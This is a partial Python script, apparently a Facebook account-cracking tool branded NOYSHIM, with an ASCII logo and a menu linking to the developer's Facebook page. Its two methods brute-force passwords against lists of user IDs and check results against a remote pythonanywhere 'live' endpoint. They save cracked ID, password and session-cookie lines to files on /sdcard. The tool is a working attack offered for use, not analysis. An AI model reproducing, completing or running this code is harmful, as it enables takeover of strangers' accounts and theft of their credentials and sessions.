...
#---------------------[ LOGO ]---------------------#
logo = f'''
  .__   __.   ______   ____    ____  _______. __    __   __  .___  ___. 
|  \ |  |  /  __  \  \   \  /   / /       ||  |  |  | |  | |   \/   | 
|   \|  | |  |  |  |  \   \/   / |   (----`|  |__|  | |  | |  \  /  | 
|  . `  | |  |  |  |   \_    _/   \   \    |   __   | |  | |  |\/|  | 
|  |\   | |  `--'  |     |  | .----)   |   |  |  |  | |  | |  |  |  | 
|__| \__|  \______/      |__| |_______/    |__|  |__| |__| |__|  |__|
{W}{47*'-'}
{xd} DEVELOPER {R}:{G} NOYSHIM
...
def NOYSHIM():
    ...
    if ___option___ in ["1"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');poco.append('1');______randomxmenu_______()
    elif ___option___ in ["2"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');poco.append('2');______randomxmenu_______()
    elif ___option___ in ["3"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');poco.append('3');______randomxmenu_______()
    elif ___option___ in ["4"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');poco.append('4');______randomxmenu_______()
    elif ___option___ in ["5"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');poco.append('5');______randomxmenu_______()
    elif ___option___ in ["6"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');poco.append('6');______randomxmenu_______()
    elif ___option___ in ["0"]:exit()
    else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);NOYSHIM()
...
def ____methodA____(ids,pasx,tl):
    ...
    sys.stdout.write(f'\r\r{xd}-{R}[{G}NOYSHIM-M1{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}] ');sys.stdout.flush()
    for pw in pasx:
        try:
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in ewe.cookies.get_dict():
                ...
                print(f"\r{xd}-{R}[{Y}NOYSHIM-CP{R}]{Y} {uid} | {pw} ")
                open('/sdcard/NOYSHIM-M1-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                cp+=1
                break
                ...
                response = str(requests.get(f"https://NOYSHIM143.pythonanywhere.com/live?uid={uid}").text)
                if 'LIVE' in response:
                    print(f"\r{xd}-{R}[{G}NOYSHIM-OK{R}]{G} {uid} | {pw} ")
                    print(f"\r{R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")
                    open('/sdcard/NOYSHIM-M1-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
                    ok+=1
                    break
                else:continue
...
def ____methodB____(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r\r{xd}-{R}[{G}NOYSHIM-M2{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}] ');sys.stdout.flush()
        try:
                for pw in pasx:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'LIVE' in response:
                                            print(f"\r{xd}-{R}[{G}NOYSHIM-OK{R}]{G} {uid} | {pw} ")
                                            print(f"\r {R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")
                                            open('/sdcard/NOYSHIM-M2-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
                                            ok.append(str(uid))
                                            break
                                        else:continue
                                        ...
                                        print(f"\r{xd}-{R}[{Y}NOYSHIM-CP{R}]{Y} {uid} | {pw} ")
                                        open('/sdcard/NOYSHIM-M2-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                                        cp.append(str(uid))
                                        break
                        else:continue
                loop+=1
